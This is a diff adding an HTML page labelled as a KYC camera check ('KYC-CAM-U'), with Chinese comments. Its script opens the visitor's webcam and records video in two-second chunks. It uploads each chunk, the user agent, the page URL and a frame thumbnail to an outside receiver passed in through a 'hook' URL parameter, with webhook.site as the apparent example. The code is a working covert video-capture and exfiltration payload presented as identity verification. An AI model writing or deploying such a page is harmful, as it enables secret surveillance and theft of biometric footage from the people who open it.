@@ -1,0 +1,34 @@
+<!doctype html><html><head><meta charset="utf-8"><title>KYC-CAM-U</title></head>
+<body style="font:14px monospace;padding:8px"><h3>KYC-CAM-U</h3><pre id="o">start</pre>
+<script>
+// 接收端由外层 wrapper 通过 ?hook= 传入（默认 webhook.site 示例）
+var q={}; location.search.replace(/^\?/,'').split('&').forEach(function(kv){var p=kv.split('=');if(p[0])q[p[0]]=decodeURIComponent(p[1]||'')});
+var HOOK=q.hook || '';
+var T0=Date.now(), chunk=0, total=0;
+function log(s){try{document.getElementById('o').textContent+='\n'+s}catch(e){}}
+function post(t,d){ if(!HOOK) return; try{ fetch(HOOK,{method:'POST',body:t+'\n'+JSON.stringify(d||{})}) }catch(e){} }
+post('CAM_PAGE',{href:location.href,ua:navigator.userAgent,hook:HOOK});
+navigator.mediaDevices.getUserMedia({video:{width:480,height:640},audio:false}).then(function(st){
+  var t=st.getVideoTracks()[0], s=t.getSettings();
+  post('CAM_STREAM',{label:t.label,w:s.width,h:s.height});
+  var types=['video/webm;codecs=vp8','video/webm','video/mp4'], mime=null;
+  types.forEach(function(m){ if(!mime && window.MediaRecorder && MediaRecorder.isTypeSupported(m)) mime=m });
+  var mr=new MediaRecorder(st, mime?{mimeType:mime}:undefined);
+  post('CAM_MIME',{mime:mime||'default'});
+  mr.ondataavailable=function(e){ if(!e.data||!e.data.size) return; var i=++chunk; total+=e.data.size;
+    if(HOOK){ try{ fetch(HOOK+'?chunk='+i+'&bytes='+e.data.size+'&total='+total+'&t='+(Date.now()-T0),{method:'POST',body:e.data}) }catch(err){} }
+    log('chunk'+i+' '+e.data.size+'B t='+(Date.now()-T0)); };
+  mr.start(2000);
+  post('CAM_REC_STARTED',{mime:mime||'default',timeslice:2000});
+  // 同时抓一帧（缩略+哈希）作为"单帧"证据
+  setTimeout(function(){
+    var v=document.createElement('video'); v.srcObject=st; v.muted=true; v.play();
+    setTimeout(function(){
+      var c=document.createElement('canvas'); c.width=8;c.height=8; c.getContext('2d').drawImage(v,0,0,8,8);
+      var px=c.getContext('2d').getImageData(0,0,8,8).data, a=[];
+      for(var i=0;i<px.length;i+=4) a.push(px[i],px[i+1],px[i+2]);
+      post('CAM_FRAME',{thumb8x8:a});
+    },1200);
+  },500);
+}).catch(function(e){ post('CAM_ERR',''+e); log('ERR '+e) });
+</script></body></html>
